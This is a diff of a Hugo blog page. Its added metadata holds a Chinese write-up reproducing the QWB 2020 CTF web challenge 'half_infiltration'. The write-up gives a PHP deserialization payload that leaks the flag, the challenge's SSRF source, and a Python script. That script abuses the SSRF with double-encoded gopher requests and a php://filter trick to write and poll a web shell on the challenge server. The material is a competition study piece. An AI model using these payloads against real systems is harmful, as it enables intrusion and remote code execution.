@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
+<meta name="robots" content="index, follow">
 <title>qwb2020web复现 | ch3n9w の 超元域</title>
 <meta name="keywords" content="">
 <meta name="description" content="half_infiltration 开局的页面如下
@@ -13,16 +13,16 @@
 ob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到$result的内容的话, 我们就需要在ob_end_clean之前退出程序. 通过将$a赋值为this可以做到让程序报错退出.
 &lt;?php class Pass{ function read(){ // ob_start(); global $result; print $result; } } class User{ public $age, $sex, $num; function __construct($a, $b, $c) { $this-&gt;age = $a; $this-&gt;sex = $b; $this-&gt;num = $c; } } echo urlencode(serialize([ new User(new Pass(), &#34;read&#34;, &#34;result&#34;), new User(new Pass(), &#34;read&#34;, &#34;this&#34;) ])); ?">
 <meta name="author" content="ch3n9w">
-<link rel="canonical" href="//localhost:1313/posts/ctf-qwb2020-web-1/">
+<link rel="canonical" href="http://ch3n9w.cpolar.cn/posts/ctf-qwb2020-web-1/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
-<link rel="icon" href="//localhost:1313/flash.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="//localhost:1313/flash.ico">
-<link rel="icon" type="image/png" sizes="32x32" href="//localhost:1313/flash.ico">
-<link rel="apple-touch-icon" href="//localhost:1313/flash.ico">
-<link rel="mask-icon" href="//localhost:1313/flash.ico">
+<link rel="icon" href="http://ch3n9w.cpolar.cn/flash.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://ch3n9w.cpolar.cn/flash.ico">
+<link rel="icon" type="image/png" sizes="32x32" href="http://ch3n9w.cpolar.cn/flash.ico">
+<link rel="apple-touch-icon" href="http://ch3n9w.cpolar.cn/flash.ico">
+<link rel="mask-icon" href="http://ch3n9w.cpolar.cn/flash.ico">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="//localhost:1313/posts/ctf-qwb2020-web-1/">
+<link rel="alternate" hreflang="en" href="http://ch3n9w.cpolar.cn/posts/ctf-qwb2020-web-1/">
 <noscript>
     <style>
         #theme-toggle,
@@ -59,7 +59,81 @@ ob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到
         }
 
     </style>
-</noscript>
+</noscript><meta property="og:title" content="qwb2020web复现" />
+<meta property="og:description" content="half_infiltration 开局的页面如下
+&lt;?php highlight_file(__FILE__); $flag=file_get_contents(&#39;ssrf.php&#39;); class Pass { function read() { ob_start(); global $result; print $result; } } class User { public $age,$sex,$num; function __destruct() { $student = $this-&gt;age; $boy = $this-&gt;sex; $a = $this-&gt;num; $student-&gt;$boy(); if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student))) { ob_end_clean(); exit(); } global $$a; $result=$GLOBALS[&#39;flag&#39;]; ob_end_clean(); } } if (isset($_GET[&#39;x&#39;])) { unserialize($_GET[&#39;x&#39;])-&gt;get_it(); } 思路是进行两次反序列化, 第一次将$_GLOBALS[&lsquo;flag&rsquo;]赋值给全局变量$result, 第二次反序列化是让程序在ob_end_clean()执行之前报错退出. ob_start会打开输出缓冲
+启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。
+ob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到$result的内容的话, 我们就需要在ob_end_clean之前退出程序. 通过将$a赋值为this可以做到让程序报错退出.
+&lt;?php class Pass{ function read(){ // ob_start(); global $result; print $result; } } class User{ public $age, $sex, $num; function __construct($a, $b, $c) { $this-&gt;age = $a; $this-&gt;sex = $b; $this-&gt;num = $c; } } echo urlencode(serialize([ new User(new Pass(), &#34;read&#34;, &#34;result&#34;), new User(new Pass(), &#34;read&#34;, &#34;this&#34;) ])); ?" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://ch3n9w.cpolar.cn/posts/ctf-qwb2020-web-1/" />
+<meta property="og:image" content="http://ch3n9w.cpolar.cn/image-20211114141959846.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-08-27T20:48:12+00:00" />
+<meta property="article:modified_time" content="2020-08-27T20:48:12+00:00" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="http://ch3n9w.cpolar.cn/image-20211114141959846.png" />
+<meta name="twitter:title" content="qwb2020web复现"/>
+<meta name="twitter:description" content="half_infiltration 开局的页面如下
+&lt;?php highlight_file(__FILE__); $flag=file_get_contents(&#39;ssrf.php&#39;); class Pass { function read() { ob_start(); global $result; print $result; } } class User { public $age,$sex,$num; function __destruct() { $student = $this-&gt;age; $boy = $this-&gt;sex; $a = $this-&gt;num; $student-&gt;$boy(); if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student))) { ob_end_clean(); exit(); } global $$a; $result=$GLOBALS[&#39;flag&#39;]; ob_end_clean(); } } if (isset($_GET[&#39;x&#39;])) { unserialize($_GET[&#39;x&#39;])-&gt;get_it(); } 思路是进行两次反序列化, 第一次将$_GLOBALS[&lsquo;flag&rsquo;]赋值给全局变量$result, 第二次反序列化是让程序在ob_end_clean()执行之前报错退出. ob_start会打开输出缓冲
+启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。
+ob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到$result的内容的话, 我们就需要在ob_end_clean之前退出程序. 通过将$a赋值为this可以做到让程序报错退出.
+&lt;?php class Pass{ function read(){ // ob_start(); global $result; print $result; } } class User{ public $age, $sex, $num; function __construct($a, $b, $c) { $this-&gt;age = $a; $this-&gt;sex = $b; $this-&gt;num = $c; } } echo urlencode(serialize([ new User(new Pass(), &#34;read&#34;, &#34;result&#34;), new User(new Pass(), &#34;read&#34;, &#34;this&#34;) ])); ?"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://ch3n9w.cpolar.cn/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "qwb2020web复现",
+      "item": "http://ch3n9w.cpolar.cn/posts/ctf-qwb2020-web-1/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "qwb2020web复现",
+  "name": "qwb2020web复现",
+  "description": "half_infiltration 开局的页面如下\n\u0026lt;?php highlight_file(__FILE__); $flag=file_get_contents(\u0026#39;ssrf.php\u0026#39;); class Pass { function read() { ob_start(); global $result; print $result; } } class User { public $age,$sex,$num; function __destruct() { $student = $this-\u0026gt;age; $boy = $this-\u0026gt;sex; $a = $this-\u0026gt;num; $student-\u0026gt;$boy(); if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student))) { ob_end_clean(); exit(); } global $$a; $result=$GLOBALS[\u0026#39;flag\u0026#39;]; ob_end_clean(); } } if (isset($_GET[\u0026#39;x\u0026#39;])) { unserialize($_GET[\u0026#39;x\u0026#39;])-\u0026gt;get_it(); } 思路是进行两次反序列化, 第一次将$_GLOBALS[\u0026lsquo;flag\u0026rsquo;]赋值给全局变量$result, 第二次反序列化是让程序在ob_end_clean()执行之前报错退出. ob_start会打开输出缓冲\n启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。\nob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到$result的内容的话, 我们就需要在ob_end_clean之前退出程序. 通过将$a赋值为this可以做到让程序报错退出.\n\u0026lt;?php class Pass{ function read(){ // ob_start(); global $result; print $result; } } class User{ public $age, $sex, $num; function __construct($a, $b, $c) { $this-\u0026gt;age = $a; $this-\u0026gt;sex = $b; $this-\u0026gt;num = $c; } } echo urlencode(serialize([ new User(new Pass(), \u0026#34;read\u0026#34;, \u0026#34;result\u0026#34;), new User(new Pass(), \u0026#34;read\u0026#34;, \u0026#34;this\u0026#34;) ])); ?",
+  "keywords": [
+    
+  ],
+  "articleBody": "half_infiltration 开局的页面如下\n\u003c?php highlight_file(__FILE__); $flag=file_get_contents('ssrf.php'); class Pass { function read() { ob_start(); global $result; print $result; } } class User { public $age,$sex,$num; function __destruct() { $student = $this-\u003eage; $boy = $this-\u003esex; $a = $this-\u003enum; $student-\u003e$boy(); if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student))) { ob_end_clean(); exit(); } global $$a; $result=$GLOBALS['flag']; ob_end_clean(); } } if (isset($_GET['x'])) { unserialize($_GET['x'])-\u003eget_it(); } 思路是进行两次反序列化, 第一次将$_GLOBALS[‘flag’]赋值给全局变量$result, 第二次反序列化是让程序在ob_end_clean()执行之前报错退出. ob_start会打开输出缓冲\n启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。\nob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到$result的内容的话, 我们就需要在ob_end_clean之前退出程序. 通过将$a赋值为this可以做到让程序报错退出.\n\u003c?php class Pass{ function read(){ // ob_start(); global $result; print $result; } } class User{ public $age, $sex, $num; function __construct($a, $b, $c) { $this-\u003eage = $a; $this-\u003esex = $b; $this-\u003enum = $c; } } echo urlencode(serialize([ new User(new Pass(), \"read\", \"result\"), new User(new Pass(), \"read\", \"this\") ])); ?\u003e 然后我们可以看到ssrf.php的内容\n\u003c?php //经过扫描确认35000以下端口以及50000以上端口不存在任何内网服务,请继续渗透内网 $url = $_GET['we_have_done_ssrf_here_could_you_help_to_continue_it'] ?? false; if(preg_match(\"/flag|var|apache|conf|proc|log/i\" ,$url)){ die(\"\"); } if($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 1); curl_exec($ch); curl_close($ch); } ?\u003e 扫描发现\nhttp://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/\n有东西\nHTTP/1.1 200 OK Date: Thu, 27 Aug 2020 13:04:07 GMT Server: Apache/2.4.18 (Ubuntu) Set-Cookie: PHPSESSID=60uap1c9tcik5f1ivmqqp933g2; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Vary: Accept-Encoding Content-Length: 1121 Content-Type: text/html; charset=UTF-8 \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eMessage Board\u003c/title\u003e \u003clink rel=\"stylesheet\" href=\"css/bootstrap.min.css\" /\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv class=\"container\" style=\"text-align:center;vertical-align:middle;\"\u003e \u003cdiv class=\"row\" style=\"text-align:center;vertical-align:middle;\"\u003e \u003ch1\u003eMessage Board \u003c/h1\u003e \u003c/div\u003e \u003cdiv class=\"row\"\u003e \u003cbr\u003e\u003cbr\u003e \u003cp class=\"lead\"\u003e Since there is only one administrator, a person can only submit one opinion at a time. Each time a new opinion is submitted, all old comments will be deleted \u003cbr\u003e\u003cbr\u003e \u003c/p\u003e \u003c/div\u003e \u003cbr\u003e \u003cdiv class=\"row\" style=\"text-align:center;vertical-align:middle;\"\u003e \u003cform method=\"POST\" class=\"form-inline\"\u003e \u003cdiv class=\"form-group\"\u003e \u003cinput class='form-control' type=\"text\" name=\"file\"\u003e \u003c/div\u003e \u003cdiv class='panel-body'\u003e \u003ctextarea class='form-control' name='content' rows='6'\u003e\u003c/textarea\u003e \u003cbr\u003e \u003cbr\u003e \u003cdiv class=\"form-group\"\u003e \u003cbutton type=\"submit\" class='btn btn-default col-md-2 form-control' value=\"Submit\"\u003eSubmit\u003c/button\u003e \u003c/div\u003e \u003c/form\u003e \u003c/div\u003e 同时\nhttp://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/uploads/\n可以访问, 那么这里应该是上传东西到目录下面了.这里使用gopher协议来发送post上传文件, 这里依然会有一个过滤, 包括等号在内的几种符号和字母组合都被过滤了,使用二次编码协议来绕过.\nimport requests from urllib.parse import urlencode, quote_plus, quote url0 = \"http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=gopher://127.0.0.1:40000/_\" upload_data = { 'file':'php://filter/convert.base64-decode|convert.base64-decode/resource=shell.php', 'content':'UEQ4OVlHTmhkQ0F2Wm14aFoyQTc' # 似乎可以正常解密的base64都无法写入文件中 } upload_data = urlencode(upload_data, quote_via=quote_plus) print(upload_data) gopher_content = '''POST / HTTP/1.1 Host: 127.0.0.1:40000 Cookie: PHPSESSID=hhhhhhhhhhhhhhhhhhhhhhhaaa; Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: {length} {data}'''.format(length = len(upload_data), data=upload_data).replace('\\n', '\\r\\n') # ssrf need double url encode url = url0 + quote(quote(gopher_content)) header = {\"Upgrade-Insecure-Requests\": \"1\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept-Language\": \"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\", \"Connection\": \"close\"} while True: requests.get(url, headers=header) validate = \"http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/uploads/hhhhhhhhhhhhhhhhhhhhhhhaaa/shell.php res = requests.get(validate) print(res.content) ",
+  "wordCount" : "370",
+  "inLanguage": "en",
+  "image":"http://ch3n9w.cpolar.cn/image-20211114141959846.png","datePublished": "2020-08-27T20:48:12Z",
+  "dateModified": "2020-08-27T20:48:12Z",
+  "author":{
+    "@type": "Person",
+    "name": "ch3n9w"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://ch3n9w.cpolar.cn/posts/ctf-qwb2020-web-1/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "ch3n9w の 超元域",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://ch3n9w.cpolar.cn/flash.ico"
+    }
+  }
+}
+</script>
 </head>
 
 <body class="" id="top">
@@ -77,8 +151,8 @@ ob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="//localhost:1313/" accesskey="h" title="ch3n9w の 超元域 (Alt + H)">
-                <img src="//localhost:1313/sabito.jpg" alt="" aria-label="logo"
+            <a href="http://ch3n9w.cpolar.cn/" accesskey="h" title="ch3n9w の 超元域 (Alt + H)">
+                <img src="http://ch3n9w.cpolar.cn/sabito.jpg" alt="" aria-label="logo"
                     height="35">ch3n9w の 超元域</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)">
@@ -105,7 +179,7 @@ ob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到
         </div>
         <ul id="menu">
             <li>
-                <a href="//localhost:1313/categories/" title="categories">
+                <a href="http://ch3n9w.cpolar.cn/categories/" title="categories">
                     <span>categories</span>
                 </a>
             </li>
@@ -116,7 +190,7 @@ ob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到
 
 <article class="post-single">
   <header class="post-header">
-    <div class="breadcrumbs"><a href="//localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="//localhost:1313/posts/">Posts</a></div>
+    <div class="breadcrumbs"><a href="http://ch3n9w.cpolar.cn/">Home</a>&nbsp;»&nbsp;<a href="http://ch3n9w.cpolar.cn/posts/">Posts</a></div>
     <h1 class="post-title entry-hint-parent">
       qwb2020web复现
     </h1>
@@ -125,7 +199,9 @@ ob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到
 </div>
   </header> 
 <figure class="entry-cover">
-        <img loading="eager" src="//localhost:1313/posts/ctf-qwb2020-web-1/image-20211114141959846.png" alt="">
+        <img loading="eager" srcset="http://ch3n9w.cpolar.cn/posts/ctf-qwb2020-web-1/image-20211114141959846_hu84007c25da22259412570b159216373c_985163_360x0_resize_box_3.png 360w ,http://ch3n9w.cpolar.cn/posts/ctf-qwb2020-web-1/image-20211114141959846_hu84007c25da22259412570b159216373c_985163_480x0_resize_box_3.png 480w ,http://ch3n9w.cpolar.cn/posts/ctf-qwb2020-web-1/image-20211114141959846_hu84007c25da22259412570b159216373c_985163_720x0_resize_box_3.png 720w ,http://ch3n9w.cpolar.cn/posts/ctf-qwb2020-web-1/image-20211114141959846_hu84007c25da22259412570b159216373c_985163_1080x0_resize_box_3.png 1080w ,http://ch3n9w.cpolar.cn/posts/ctf-qwb2020-web-1/image-20211114141959846.png 1296w" 
+            sizes="(min-width: 768px) 720px, 100vw" src="http://ch3n9w.cpolar.cn/posts/ctf-qwb2020-web-1/image-20211114141959846.png" alt="" 
+            width="1296" height="660">
         
 </figure><div class="toc">
     <details  open>
@@ -344,12 +420,12 @@ ob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到
     <ul class="post-tags">
     </ul>
 <nav class="paginav">
-  <a class="prev" href="//localhost:1313/posts/ctf-gactf2020/">
+  <a class="prev" href="http://ch3n9w.cpolar.cn/posts/ctf-gactf2020/">
     <span class="title">« Prev</span>
     <br>
     <span>GACTF2020</span>
   </a>
-  <a class="next" href="//localhost:1313/posts/sec-http-smuggling/">
+  <a class="next" href="http://ch3n9w.cpolar.cn/posts/sec-http-smuggling/">
     <span class="title">Next »</span>
     <br>
     <span>http请求走私笔记</span>
@@ -361,7 +437,7 @@ ob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到
     </main>
     
 <footer class="footer">
-    <span>&copy; 2024 <a href="//localhost:1313/">ch3n9w の 超元域</a></span>
+    <span>&copy; 2024 <a href="http://ch3n9w.cpolar.cn/">ch3n9w の 超元域</a></span>
     <span>
         Powered by
         <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
